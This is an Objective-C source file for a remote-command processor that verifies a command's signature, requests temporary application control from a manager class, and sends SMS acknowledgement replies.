//
//  RequestTemporalApplicationControlProcessor.m
//  RCM
//
//  Created by Benjawan Tanarattanakorn on 3/16/2558 BE.
//
//

#import "RequestTemporalApplicationControlProcessor.h"




@interface RequestTemporalApplicationControlProcessor (PrivateAPI)
- (void) processRequestTemporalApplicationControl;
- (void) acknowldgeMessage;
- (void) requestTemporalApplicationControlException;
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete;
- (void) processFinished;
@end


@implementation RequestTemporalApplicationControlProcessor


/**
 - Method name: initWithRemoteCommandData:andCommandProcessingDelegate
 - Purpose:This method is used to initialize the RequestTemporalApplicationControlProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData),aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Return description: No return type
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
    DLog (@"RequestTemporalApplicationControlProcessor--->initWithRemoteCommandData")
	if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
	}
	return self;
}


#pragma mark RemoteCmdProcessor Methods


/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the RequestTemporalApplicationControlProcessor
 - Argument list and description:No Argument
 - Return description: No return type
 */

- (void) doProcessingCommand {
    DLog (@"RequestTemporalApplicationControlProcessor--->doProcessingCommand");
    
	if (![RemoteCmdSignatureUtils verifyRemoteCmdDataSignature:mRemoteCmdData
                                  numberOfMinimumCompulsoryTag:2]) {
		[RemoteCmdSignatureUtils throwInvalidCmdWithName:@"RequestTemporalApplicationControlProcessor"
												  reason:@"Failed signature check"];
	}
	
	[self processRequestTemporalApplicationControl];
}


#pragma mark RequestTemporalApplicationControlProcessor Private Mehods


/**
 - Method name: processRequestTemporalApplicationControl
 - Purpose:This method is used to process RequestTemporalApplicationControlProcessor
 - Argument list and description: No argument
 - Return description:No return type
 */

- (void) processRequestTemporalApplicationControl {
	DLog (@"RequestTemporalApplicationControlProcessor--->processRequestTemporalApplicationControl");
    // Request Temporal Control
    id <TemporalControlManager> temporalControlManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mTemporalControlManager];
    
    BOOL isReady = [temporalControlManager requestTemporalControl:self];
    
    if (!isReady) {
        DLog (@"!!! not ready to process RequestTemporalApplicationControlProcessor command")
		[self requestTemporalApplicationControlException];
    } else {
       	DLog (@".... processing RequestTemporalApplicationControlProcessor command");
        [self acknowldgeMessage];
    }
}

/**
 - Method name:			requestTemporalApplicationControlException
 - Purpose:				This method is invoked when it fails to request temporal application control
 - Argument list and description:	No Return Type
 - Return description:	No Argument
 */
- (void) requestTemporalApplicationControlException {
	DLog (@"RequestTemporalApplicationControlProcessor ---> requestTemporalApplicationControlException");
	FxException* exception = [FxException exceptionWithName:@"requestTemporalApplicationControlException" andReason:@"Request Temporal Control Applications error"];
	[exception setErrorCode:kTemporalControlManagerBusy];
	[exception setErrorCategory:kFxErrorRCM];
	@throw exception;
}

/**
 - Method name: acknowldgeMessage
 - Purpose:		This method is used to prepare acknowldge message
 - Argument list and description:	No Argument
 - Return description:				No Return
 */

- (void) acknowldgeMessage {
	NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                          andErrorCode:_SUCCESS_];
	NSString *ackMessage=[messageFormat stringByAppendingString:NSLocalizedString(@"kRequestTemporalApplicationControlMSG1", @"")];
	[self sendReplySMS:ackMessage isProcessCompleted:NO];
}


/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
 */

- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete  {
	DLog (@"RequestTemporalApplicationControlProcessor--->sendReplySMS");
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:aReplyMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber]
															   andMessage:aReplyMessage];
	}
	if (aIsComplete) {
		[self processFinished];
	}
	else {
		DLog (@"Sent acknowldge message.");
	}
}

/**
 - Method name: processFinished
 - Purpose:This method is invoked when RequestTemporalApplicationControlProcessor is completed
 - Argument list and description:No Argument
 - Return description:isValidArguments (BOOL)
 */

-(void) processFinished {
	DLog (@"RequestTemporalApplicationControlProcessor--->processFinished");
	if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
		[mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:) withObject:self withObject:mRemoteCmdData];
	}
}


#pragma mark TemporalControlDelegate methods


- (void) requestTemporalControlCompleted: (NSError *) aError {
    DLog(@"RequestTemporalApplicationControlProcessor--->Request temporal control completed.")
    NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                          andErrorCode:_SUCCESS_];
	NSString *ackMessage    = [messageFormat stringByAppendingString:NSLocalizedString(@"kRequestTemporalApplicationControlMSG2", @"")];
	[self sendReplySMS:ackMessage isProcessCompleted:YES];
}

- (void) syncTemporalControlCompleted: (NSError *) aError {
    
}
 
/**
- Method name: dealloc
- Purpose:This method is used to Handle Memory managment
- Argument list and description:No Argument
- Return description: No Return Type
*/

- (void) dealloc {
	DLog (@"dealloc of Request Temporal Application Control Manager");
	[super dealloc];
}


@end
